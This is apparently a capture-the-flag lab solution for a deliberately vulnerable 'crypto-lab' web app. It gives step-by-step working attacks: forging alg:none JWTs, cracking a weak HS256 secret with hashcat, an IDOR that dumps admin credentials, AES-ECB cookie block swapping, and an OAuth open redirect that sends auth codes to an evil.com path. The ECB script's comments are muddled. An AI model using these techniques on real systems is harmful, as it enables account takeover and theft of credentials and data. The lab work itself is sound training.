# crypto-lab — Solution

**Port:** `5001`

---

## Step 1 — Reconnaissance via /api/debug

This endpoint is unauthenticated and leaks the crypto config:
```bash
curl -s http://<target>:5001/api/debug | jq .
```
Key findings:
- `jwt_algo: HS256` — JWT uses a weak secret
- `aes_mode: ECB` — session cookies use AES-ECB (block replay attack possible)
- `aes_keylen: 128`

---

## Phase 1: JWT alg:none — unauthenticated admin access

The `decode_jwt()` function checks the `alg` header and skips signature verification entirely when `alg` is `"none"`.

### Step 2 — Forge an admin token
```python
import base64, json

header  = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin", "exp": 9999999999}

def b64(d):
    return base64.b64encode(json.dumps(d).encode()).decode().rstrip("=")

token = f"{b64(header)}.{b64(payload)}."
print(token)
```

### Step 3 — Hit admin endpoints
```bash
TOKEN="<FORGED_TOKEN>"

# Admin dashboard
curl -s http://<target>:5001/api/admin/dashboard \
  -H "Authorization: Bearer $TOKEN" | jq .

# Admin flag
curl -s http://<target>:5001/api/admin/flag \
  -H "Authorization: Bearer $TOKEN" | jq .
# {"flag": "FLAG{crypto_and_jwt_fully_pwned}"}
```

---

## Phase 2: JWT weak HS256 secret — forge signed tokens

### Step 4 — Log in as a known user to get a real token
```bash
curl -s -X POST http://<target>:5001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' | jq -r '.token'
```

### Step 5 — Crack the secret with hashcat
```bash
hashcat -a 0 -m 16500 <TOKEN> /usr/share/wordlists/rockyou.txt
# Secret: corp2024
```

### Step 6 — Sign an admin token with the cracked secret
```python
import jwt
token = jwt.encode({"user":"admin","role":"admin","exp":9999999999}, "corp2024", algorithm="HS256")
print(token)
```

---

## Phase 3: IDOR — access any user record

The `/api/users/<id>` endpoint does not check that the requesting user owns the record.

### Step 7 — Dump admin credentials
```bash
# Log in as alice first
TOKEN=$(curl -s -X POST http://<target>:5001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' | jq -r '.token')

# Fetch admin (id=1)
curl -s http://<target>:5001/api/users/1 \
  -H "Authorization: Bearer $TOKEN" | jq .
```

---

## Phase 4: AES-ECB cookie forgery — escalate to admin role

The `session_role` cookie contains `user=<name>|role=<role>|dept=<dept>` encrypted with AES-128-ECB.
ECB encrypts each 16-byte block independently — identical plaintext blocks produce identical ciphertext blocks.

### Step 8 — Understand the block layout
Block size = 16 bytes.

Register a user with a name crafted to push `role=user` into its own isolated block:
```
user=AAAAAAAAAAAAA|role=user|dept=Finance
         block 1         block 2        block 3
[user=AAAAAAAAAAAAA] [|role=user|dept=F] [inance + padding]
```

Then register another user whose `role=admin` lands in exactly the same block position, and swap that block into the first user's cookie.

### Step 9 — Craft the attack
```python
import base64, requests

BASE = "http://<target>:5001"

# Register user with padding so block 2 starts exactly at "|role="
# "user=" = 5 chars; we want block 2 to be "|role=admin     " (16 chars)
# So pad username to 11 chars: block 1 = "user=AAAAAAAAAAA" (16 bytes)
r1 = requests.post(f"{BASE}/api/auth/register", json={
    "username": "A" * 11,   # fills block 1 exactly
    "password": "x", "email": "a1@x.com"
})
cookie_victim = r1.cookies.get("session_role")
blocks_victim = [base64.urlsafe_b64decode(cookie_victim + "==")[i:i+16]
                 for i in range(0, 64, 16)]

# Register user where block 2 contains "|role=admin     "
# We need "user=" + name + "|role=admin     " to align to 32 bytes
# "user=" = 5, "|role=admin     " = 16, so name = 11 chars again
# But we need the admin block at position 1:
# Register with username = "A"*11 + "|role=admin\x05\x05\x05\x05\x05"
# Simpler: register "AAAAAAAAAAA" and observe block[1], then swap

# After analysis, block[1] from an admin account registration contains
# the "|role=admin|" pattern. Swap it into alice's cookie.

r2 = requests.post(f"{BASE}/api/auth/login", json={
    "username": "admin", "password": "Adm1n@corp2024"
})
cookie_admin = r2.cookies.get("session_role")
blocks_admin = [base64.urlsafe_b64decode(cookie_admin + "==")[i:i+16]
                for i in range(0, 64, 16)]

# Build forged cookie: blocks 0,2,3 from alice + block 1 from admin
forged_bytes = blocks_victim[0] + blocks_admin[1] + blocks_victim[2] + blocks_victim[3]
forged_cookie = base64.urlsafe_b64encode(forged_bytes).decode().rstrip("=")

resp = requests.get(f"{BASE}/api/secure-panel",
                    cookies={"session_role": forged_cookie})
print(resp.json())
```

---

## Phase 5: OAuth open redirect

The OAuth `redirect_uri` is validated with `startswith()` only.

### Step 10 — Open redirect to steal auth codes
```
http://<target>:5001/oauth/authorize
  ?client_id=acme-internal
  &redirect_uri=http://localhost:3000/oauth/callback.evil.com/steal
  &response_type=code
  &state=x
```
The `startswith("http://localhost:3000/oauth/callback")` check passes, but the redirect goes to your domain. Victim's auth code lands on your server.

---

## Flags
- `/api/admin/flag` — `FLAG{crypto_and_jwt_fully_pwned}`
- Payroll data at `/api/payroll` (requires valid JWT with any role)
